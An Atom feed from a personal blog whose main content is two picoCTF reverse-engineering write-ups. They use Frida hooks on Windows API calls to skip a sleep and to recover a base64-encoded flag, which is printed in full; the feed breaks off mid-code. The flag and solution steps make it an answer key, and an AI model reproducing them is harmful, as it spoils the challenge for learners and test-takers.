<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>River</title>
  
  
  <link href="https://rivers.sh/atom.xml" rel="self"/>
  
  <link href="https://rivers.sh/"/>
  <updated>2025-07-18T06:11:37.471Z</updated>
  <id>https://rivers.sh/</id>
  
  <author>
    <name>River</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Process Over Product</title>
    <link href="https://rivers.sh/posts/process/"/>
    <id>https://rivers.sh/posts/process/</id>
    <published>2025-07-18T04:00:00.000Z</published>
    <updated>2025-07-18T06:11:37.471Z</updated>
    
    
    <summary type="html">work in progress</summary>
    
    
    
    <category term="Blog" scheme="https://rivers.sh/categories/Blog/"/>
    
    
  </entry>
  
  <entry>
    <title>Binary Instrumentation II</title>
    <link href="https://rivers.sh/posts/binaryinstrumentation2/"/>
    <id>https://rivers.sh/posts/binaryinstrumentation2/</id>
    <published>2025-05-02T04:00:00.000Z</published>
    <updated>2025-07-17T07:35:57.965Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>I’ve been learning more Windows API functions to do my bidding. Hmm… I swear this program was supposed to create a file and write the flag directly to the file. Can you try and intercept the file writing function to see what went wrong?</p><p>Download the exe <a href="https://challenge-files.picoctf.net/c_verbal_sleep/4aee1b9778a8e56724d015b027431fb236853a94f53e5dcf32c5ed32aed404da/bininst2.zip">here</a>. Unzip the archive with the password <code>picoctf</code></p><h2 id="Basic-forensics-info"><a href="#Basic-forensics-info" class="headerlink" title="Basic forensics &amp; info"></a>Basic forensics &amp; info</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation2&gt;file bininst2.exe</span><br><span class="line">bininst2.exe: PE32+ executable (console) x86-64, for MS Windows</span><br><span class="line"></span><br><span class="line">FLARE-VM Sun 05/04/2025  4:11:07.21</span><br></pre></td></tr></table></figure><p><code>file</code> doesn’t yield anything unexpected&#x2F;unusual. Additionally, the program produces no output when ran:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation2&gt;bininst2.exe</span><br><span class="line"></span><br><span class="line">FLARE-VM Sun 05/04/2025  4:11:48.40</span><br></pre></td></tr></table></figure><h2 id="Frida-trace-exploration"><a href="#Frida-trace-exploration" class="headerlink" title="Frida-trace exploration"></a>Frida-trace exploration</h2><p>A logical attempt would be to run the same <code>frida-trace</code> command as used in the previous challenge, in which we’d target the <code>Sleep</code> call and then inspect <code>Sleep.js</code> for anything odd. However, this is not the case with this challenge, as the <code>Sleep.js</code> in both DLL folders looks normal. </p><h3 id="Overkill-frida-trace"><a href="#Overkill-frida-trace" class="headerlink" title="Overkill frida-trace"></a>Overkill frida-trace</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -f bininst2.exe -i &quot;*&quot;</span><br></pre></td></tr></table></figure><ul><li>Traces <em>ALL</em> API calls from every library</li><li><code>-i &quot;*&quot;</code> means intercept everything</li></ul><p>This <code>frida-trace</code> command may look good at a glance, as it traces everything, but this actually works against us. The reason being, is that 99% of the handlers aren’t relevant to solving the challenge, and this will just lead to information overload.</p><h3 id="Specific-frida-trace"><a href="#Specific-frida-trace" class="headerlink" title="Specific frida-trace"></a>Specific frida-trace</h3><p>Knowing that this is a CTF, it’s possible the flag is being written&#x2F;read from a file, so we can try something like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -i *File* -f bininst2.exe -X KERNEL32</span><br></pre></td></tr></table></figure><ul><li>Only traces APIs that contain “File” in their name (<code>CreateFile</code>, <code>ReadFile</code>, <code>WriteFile</code>)</li><li><code>-X KERNEL32</code> excludes <code>KERNDEL32.dll</code> APIs</li></ul><p>This command, unlike the previous one, is much more focused and less noisy, as it focuses our scope on only the necessary. </p><h2 id="Modifying-handlers"><a href="#Modifying-handlers" class="headerlink" title="Modifying handlers"></a>Modifying handlers</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation2&gt;frida-trace -i *File* -f bininst2.exe -X KERNEL32</span><br><span class="line">Instrumenting...</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Started tracing 547 functions. Web UI available at http://localhost:51013/</span><br><span class="line">           /* TID 0x18bc */</span><br><span class="line">   501 ms  NtDeviceIoControlFile()</span><br><span class="line">   501 ms  RtlDosApplyFileIsolationRedirection_Ustr()</span><br><span class="line">   501 ms  RtlDosApplyFileIsolationRedirection_Ustr()</span><br><span class="line">   501 ms  RtlDosApplyFileIsolationRedirection_Ustr()</span><br><span class="line">   501 ms  NtQueryAttributesFile()</span><br><span class="line">   501 ms  NtQueryAttributesFile()</span><br><span class="line">   501 ms  NtOpenFile()</span><br><span class="line">   501 ms  RtlDosApplyFileIsolationRedirection_Ustr()</span><br><span class="line">   511 ms  GetSystemTimeAsFileTime()</span><br><span class="line">   511 ms     | GetSystemTimeAsFileTime()</span><br><span class="line">   511 ms  GetModuleFileNameW()</span><br><span class="line">   511 ms     | GetModuleFileNameW()</span><br><span class="line">   511 ms  AreFileApisANSI()</span><br><span class="line">   511 ms     | AreFileApisANSI()</span><br><span class="line">   511 ms  CreateFileA()</span><br><span class="line">   511 ms     | CreateFileA()</span><br><span class="line">Process terminated</span><br><span class="line"></span><br><span class="line">FLARE-VM Sun 05/04/2025  4:46:25.91</span><br></pre></td></tr></table></figure><p>The output shows us that the program is utilizing <code>CreateFileA()</code>. However, upon inspecting <code>CreateFileA()</code> we see a very basic configuration, before modifying it to try and get more information, it’s important to understand what we <em>can</em> do:</p><p>A quick search led me to <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">this</a> Microsoft page, which shows the syntax for the <code>CreateFileA</code> function. I’ll also leave it below for your convenience:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateFileA(</span><br><span class="line">  [in]           LPCSTR                lpFileName,</span><br><span class="line">  [in]           DWORD                 dwDesiredAccess,</span><br><span class="line">  [in]           DWORD                 dwShareMode,</span><br><span class="line">  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span><br><span class="line">  [in]           DWORD                 dwCreationDisposition,</span><br><span class="line">  [in]           DWORD                 dwFlagsAndAttributes,</span><br><span class="line">  [in, optional] HANDLE                hTemplateFile</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="CreateFileA-modifications"><a href="#CreateFileA-modifications" class="headerlink" title="CreateFileA modifications"></a>CreateFileA modifications</h3><p>1st <code>CreateFileA</code> modification:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">defineHandler(&#123;</span><br><span class="line">  onEnter(log, args, state) &#123;</span><br><span class="line">    // Log the filename being created</span><br><span class="line">    state.filename = Memory.readUtf8String(args[0]);</span><br><span class="line">    log(&#x27;CreateFileA called with filename: &quot;&#x27; + state.filename + &#x27;&quot;&#x27;);</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  onLeave(log, retval, state) &#123;</span><br><span class="line">    // Log the result</span><br><span class="line">    log(&#x27;CreateFileA returned: &#x27; + retval);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>We read the filename string from <code>args[0]</code> (first argument to CreateFileA) and log it</li><li>We store the filename in <code>state</code> so we can reference it in the onLeave function</li><li>We log the handle returned by <code>CreateFileA</code> to see if it succeeded or failed</li><li>If the handle is <code>-1</code> (<code>INVALID_HANDLE_VALUE</code>), we know file creation failed</li><li>This tells us whether the path is valid and if file creation is working properly</li></ul><p>Output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -i CreateFileA -f bininst2.exe -X KERNEL32</span><br><span class="line"></span><br><span class="line">Started tracing 4 functions. Web UI available at http://localhost:64949/</span><br><span class="line">           /* TID 0x1a40 */</span><br><span class="line">    19 ms  CreateFileA()</span><br><span class="line">    19 ms     | CreateFileA called with filename: &quot;&lt;Insert path here&gt;&quot;</span><br><span class="line">    19 ms  CreateFileA returned: 0xffffffffffffffff</span><br><span class="line">Process terminated```</span><br></pre></td></tr></table></figure><ul><li>The program is calling <code>CreateFileA</code> with an invalid filename: &#96;&#96;”<Insert path here>“&#96; - this is clearly a placeholder that wasn’t properly replaced with a real path</li><li><code>CreateFileA</code> returned <code>0xffffffffffffffff</code>, which is <code>-1</code> or <code>INVALID_HANDLE_VALUE</code>, confirming that file creation failed</li><li>The process terminated right after this, suggesting that the flag is being processed but never successfully written to a file</li></ul><p>This lead me to further edit <code>CreateFileA</code>, but this time, let’s try replacing “<Insert path here>“ with a valid filename (“flag.txt”)</p><p>2nd <code>CreateFileA</code> modification:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">defineHandler(&#123;</span><br><span class="line">  onEnter(log, args, state) &#123;</span><br><span class="line">    // Read original filename</span><br><span class="line">    state.originalPath = Memory.readUtf8String(args[0]);</span><br><span class="line">    log(&#x27;CreateFileA - Original path: &quot;&#x27; + state.originalPath + &#x27;&quot;&#x27;);</span><br><span class="line">    </span><br><span class="line">    // Replace the invalid path with a valid one</span><br><span class="line">    const newPath = Memory.allocUtf8String(&#x27;flag.txt&#x27;);</span><br><span class="line">    args[0] = newPath;</span><br><span class="line">    </span><br><span class="line">    // Save reference to prevent garbage collection</span><br><span class="line">    state.newPath = newPath;</span><br><span class="line">    </span><br><span class="line">    log(&#x27;CreateFileA - Replaced with: &quot;flag.txt&quot;&#x27;);</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  onLeave(log, retval, state) &#123;</span><br><span class="line">    log(&#x27;CreateFileA returned: &#x27; + retval);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -i CreateFileA -f bininst2.exe -X KERNEL32</span><br><span class="line"></span><br><span class="line">Started tracing 2 functions. Web UI available at http://localhost:49254/</span><br><span class="line">           /* TID 0xb4c */</span><br><span class="line">    20 ms  CreateFileA()</span><br><span class="line">    20 ms     | CreateFileA - Original path: &quot;&lt;Insert path here&gt;&quot;</span><br><span class="line">    20 ms     | CreateFileA - Replaced with: &quot;flag.txt&quot;</span><br><span class="line">    20 ms  CreateFileA returned: 0x274</span><br><span class="line">Process terminated</span><br></pre></td></tr></table></figure><p>However, upon checking the newly created <code>flag.txt</code>, you’ll notice it’s empty… but this is okay. Since <code>CreateFileA</code> is succeeding, that means it has to be calling <code>WriteFile</code>. So, let’s try modifying the <code>WriteFile</code> handler to see if we can intercept the data it’s attempting to write. </p><h3 id="WriteFile-modification-solution"><a href="#WriteFile-modification-solution" class="headerlink" title="WriteFile modification &amp; solution"></a>WriteFile modification &amp; solution</h3><p>We can set up a <code>WriteFile</code> handler to try and intercept the flag:</p><p><code>WriteFile</code> syntax:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                HANDLE       hFile,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPCVOID      lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        nNumberOfBytesToWrite,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPDWORD      lpNumberOfBytesWritten,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>WriteFile.js</code> modification:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  onEnter(log, args, state) &#123;</span><br><span class="line">    // Log basic info</span><br><span class="line">    log(&#x27;WriteFile called with handle: &#x27; + args[0]);</span><br><span class="line">    log(&#x27;WriteFile buffer content:&#x27;);</span><br><span class="line">    log(hexdump(args[1]));</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  onLeave(log, retval, state) &#123;</span><br><span class="line">    // Log result</span><br><span class="line">    log(&#x27;WriteFile returned: &#x27; + retval);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>We’re trying to examine the data that would be written to the file using <code>lpBuffer</code></li><li>We’re logging the file handle &amp; return value to track success&#x2F;failure</li></ul><p>Output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -i CreateFileA -i WriteFile -f bininst2.exe -X KERNEL32</span><br><span class="line"></span><br><span class="line">Instrumenting...</span><br><span class="line">CreateFileA: Loaded handler at &quot;C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation2\__handlers__\KERNELBASE.dll\CreateFileA.js&quot;</span><br><span class="line">WriteFile: Loaded handler at &quot;C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation2\__handlers__\KERNELBASE.dll\WriteFile.js&quot;</span><br><span class="line">CreateFileA: Loaded handler at &quot;C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation2\__handlers__\KERNEL32.DLL\CreateFileA.js&quot;</span><br><span class="line">WriteFile: Loaded handler at &quot;C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation2\__handlers__\KERNEL32.DLL\WriteFile.js&quot;</span><br><span class="line">Started tracing 4 functions. Web UI available at http://localhost:49342/</span><br><span class="line">           /* TID 0x1838 */</span><br><span class="line">    20 ms  CreateFileA()</span><br><span class="line">    20 ms     | CreateFileA - Original path: &quot;&lt;Insert path here&gt;&quot;</span><br><span class="line">    20 ms     | CreateFileA - Replaced with: &quot;flag.txt&quot;</span><br><span class="line">    20 ms  CreateFileA returned: 0x270</span><br><span class="line">    20 ms  WriteFile()</span><br><span class="line">    20 ms     | WriteFile called with handle: 0x270</span><br><span class="line">    20 ms     | WriteFile buffer content:</span><br><span class="line">    20 ms     |             0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="line">140002270  63 47 6c 6a 62 30 4e 55 52 6e 74 6d 63 6a 46 6b  cGljb0NURntmcjFk</span><br><span class="line">140002280  59 56 39 6d 4d 48 4a 66 59 6a 46 75 58 32 6c 75  YV9mMHJfYjFuX2lu</span><br><span class="line">140002290  4e 58 52 79 64 57 30 7a 62 6e 51 30 64 47 6c 76  NXRydW0zbnQ0dGlv</span><br><span class="line">1400022a0  62 69 46 66 59 6a 49 78 59 57 56 6d 4d 7a 6c 39  biFfYjIxYWVmMzl9</span><br><span class="line">1400022b0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">1400022c0  40 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00  @...............</span><br><span class="line">1400022d0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">1400022e0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">1400022f0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">140002300  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">140002310  00 00 00 00 00 00 00 00 00 30 00 40 01 00 00 00  .........0.@....</span><br><span class="line">140002320  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">140002330  a0 21 00 40 01 00 00 00 b0 21 00 40 01 00 00 00  .!.@.....!.@....</span><br><span class="line">140002340  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">140002350  00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">140002360  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">    20 ms  WriteFile returned: 0x1</span><br><span class="line">Process terminated</span><br></pre></td></tr></table></figure><p>Looks like it could be a flag encoded via base64, let’s try and decode it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[marcial@arch ~/desktop/code/hexo]$ echo &quot;cGljb0NURntmcjFkYV9mMHJfYjFuX2luNXRydW0zbnQ0dGlvbiFfYjIxYWVmMzl9&quot; | base64 -d</span><br><span class="line">picoCTF&#123;fr1da_f0r_b1n_in5trum3nt4tion!_b21aef39&#125;%</span><br></pre></td></tr></table></figure><p>flag: <code>cGljb0NURntmcjFkYV9mMHJfYjFuX2luNXRydW0zbnQ0dGlvbiFfYjIxYWVmMzl9&quot; | base64 -d picoCTF&#123;fr1da_f0r_b1n_in5trum3nt4tion!_b21aef39&#125;%</code></p>]]></content>
    
    
    <summary type="html">Intercepting &amp; monitoring Windows API calls to find a flag in a hidden buffer</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Reverse Engineering" scheme="https://rivers.sh/tags/Reverse-Engineering/"/>
    
    <category term="Frida" scheme="https://rivers.sh/tags/Frida/"/>
    
    <category term="Binary Instrumentation" scheme="https://rivers.sh/tags/Binary-Instrumentation/"/>
    
    <category term="JavaScript" scheme="https://rivers.sh/tags/JavaScript/"/>
    
    <category term="Windows API" scheme="https://rivers.sh/tags/Windows-API/"/>
    
  </entry>
  
  <entry>
    <title>Binary Instrumentation I</title>
    <link href="https://rivers.sh/posts/binaryinstrumentation1/"/>
    <id>https://rivers.sh/posts/binaryinstrumentation1/</id>
    <published>2025-05-01T04:00:00.000Z</published>
    <updated>2025-07-17T07:31:55.726Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>I have been learning to use the Windows API to do cool stuff! Can you wake up my program to get the flag?<br>Download the exe <a href="https://challenge-files.picoctf.net/c_verbal_sleep/c71239e2890bd0008ff9c1da986438d276e7a96ba123cb3bc7b04d5a3de27fe7/bininst1.zip">here</a>. Unzip the archive with the password <code>picoctf</code></p><p>This challenge is #1 of a 2 part series </p><p><a href="https://rivers.sh/posts/binaryinstrumentation2/">Binary Instrumentation II</a></p><h2 id="Basic-forensics-info"><a href="#Basic-forensics-info" class="headerlink" title="Basic forensics &amp; info"></a>Basic forensics &amp; info</h2><p><code>File</code> command for basic info:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation1\bininst1&gt;file bininst1.exe</span><br><span class="line">bininst1.exe: PE32+ executable (console) x86-64, for MS Windows</span><br><span class="line"></span><br><span class="line">FLARE-VM Fri 05/02/2025 18:41:00.51</span><br></pre></td></tr></table></figure><p>Running the program:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation1\bininst1&gt;bininst1.exe</span><br><span class="line">Hi, I have the flag for you just right here!</span><br><span class="line">I&#x27;ll just take a quick nap before I print it out for you, should only take me a decade or so!</span><br><span class="line">zzzzzzzz....</span><br></pre></td></tr></table></figure><p>Knowing that the program is a Windows executable, and based off the output when running it, I assume we’ll have to target the Windows API <code>Sleep</code> call using Frida, a dynamic instrumentation toolkit that will let us trace, monitor, and modify the behavior of applications. Specifically, we will use <code>frida-trace</code> to trace function calls (<code>Sleep</code>, in this case&#96;):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation1&gt;frida-trace -i Sleep -f bininst1.exe</span><br><span class="line">Instrumenting...</span><br><span class="line">Sleep: Auto-generated handler at &quot;C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation1\__handlers__\KERNELBASE.dll\Sleep.js&quot;</span><br><span class="line">Sleep: Auto-generated handler at &quot;C:\Users\river\Desktop\ctf\pico\BinaryInstrumentation1\__handlers__\KERNEL32.DLL\Sleep.js&quot;</span><br><span class="line">Started tracing 2 functions. Web UI available at http://localhost:50498/</span><br><span class="line">Hi, I have the flag for you just right here!</span><br><span class="line">I&#x27;ll just take a quick nap before I print it out for you, should only take me a decade or so!</span><br><span class="line">zzzzzzzz....</span><br><span class="line">           /* TID 0x179c */</span><br><span class="line">    31 ms  Sleep()</span><br><span class="line">    31 ms     | Sleep()</span><br></pre></td></tr></table></figure><p>When we run frida-trace to instrument a function like Sleep, it automatically creates JavaScript handler files for each implementation of that function it finds. This is a powerful feature of Frida that allows us to not just observe, but also modify program behavior at runtime.<br>In our case, Frida generated two handler files:</p><ul><li><code>\__handlers__\KERNELBASE.DLL\Sleep.js</code></li><li><code>\__handlers__\KERNEL32.DLL\Sleep.js</code></li></ul><p>For clarification, both <code>Sleep.js</code> files are the same. Frida generates two handlers because of how Windows API functions are implemented:</p><ol><li><code>KERNEL32.DLL</code> is the higher-level library that applications typically link against</li><li><code>KERNELBASE.dll</code> is the lower-level implementation that KERNEL32.DLL often forwards calls to</li></ol><p>In most cases, the <code>Sleep</code> function in <code>KERNEL32.DLL</code> will just simply forward the call to <code>KERNELBASE.dll</code>. For this challenge, we <em>should</em> be able to modify either one because:</p><ul><li>If the program calls Sleep directly from KERNEL32.DLL, modifying that handler will work</li><li>If KERNEL32.DLL forwards to KERNELBASE.dll, modifying the KERNELBASE handler will work</li><li>If we modify both, we’re covered either way</li></ul><p>So, for the sake of this challenge, I will be modifying the <code>KERNEL32.dll</code> one.</p><h3 id="KERNEL32-DLL-Sleep-js"><a href="#KERNEL32-DLL-Sleep-js" class="headerlink" title="KERNEL32.DLL\Sleep.js"></a>KERNEL32.DLL\Sleep.js</h3><p>The file for your convenience:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Auto-generated by Frida. Please modify to match the signature of Sleep.</span></span><br><span class="line"><span class="comment"> * This stub is currently auto-generated from manpages when available.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For full API reference, see: https://frida.re/docs/javascript-api/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">defineHandler</span>(&#123;</span><br><span class="line">  <span class="title function_">onEnter</span>(<span class="params">log, args, state</span>) &#123;</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;Sleep()&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title function_">onLeave</span>(<span class="params">log, retval, state</span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol><li><p><code>defineHandler(&#123; ... &#125;)</code> - This is a Frida function that registers a new handler for the targeted function (Sleep in this case).</p></li><li><p><code>onEnter(log, args, state)</code> - This callback function is executed right before the actual Sleep function is called:</p><ul><li><code>log</code> - A function you can use to print messages to the Frida console</li><li><code>args</code> - An array containing the function arguments (in this case, Sleep takes one argument for the sleep duration in milliseconds)</li><li><code>state</code> - An object where you can store data to share between onEnter and onLeave</li></ul></li><li><p><code>log(&#39;Sleep()&#39;)</code> - This simply logs “Sleep()” to the console when the function is called, but doesn’t include any details about the arguments.</p></li><li><p><code>onLeave(log, retval, state)</code> - This callback is executed after the Sleep function returns:</p><ul><li><code>retval</code> - Contains the return value of the function (this is empty, so it actually doesn’t even do anything when <code>Sleep</code> returns)</li></ul></li></ol><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>To solve the challenge, we’d need to modify this file and change the <code>Sleep</code> duration argument. Ultimately, i decided to come up with a modification that not only replaces the sleep duration with 0, but also logs the original sleep duration, just for troubleshooting &#x2F; analysis purposes:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">defineHandler</span>(&#123;</span><br><span class="line">  <span class="title function_">onEnter</span>(<span class="params">log, args, state</span>) &#123;</span><br><span class="line">    <span class="comment">// logs the original sleep duration</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="string">`Sleep(<span class="subst">$&#123;args[<span class="number">0</span>]&#125;</span>) - Original duration: <span class="subst">$&#123;args[<span class="number">0</span>].toInt32()&#125;</span> ms`</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// replaces the sleep duration with 0</span></span><br><span class="line">    args[<span class="number">0</span>] = <span class="title function_">ptr</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&quot;Sleep duration changed to 0 ms&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span 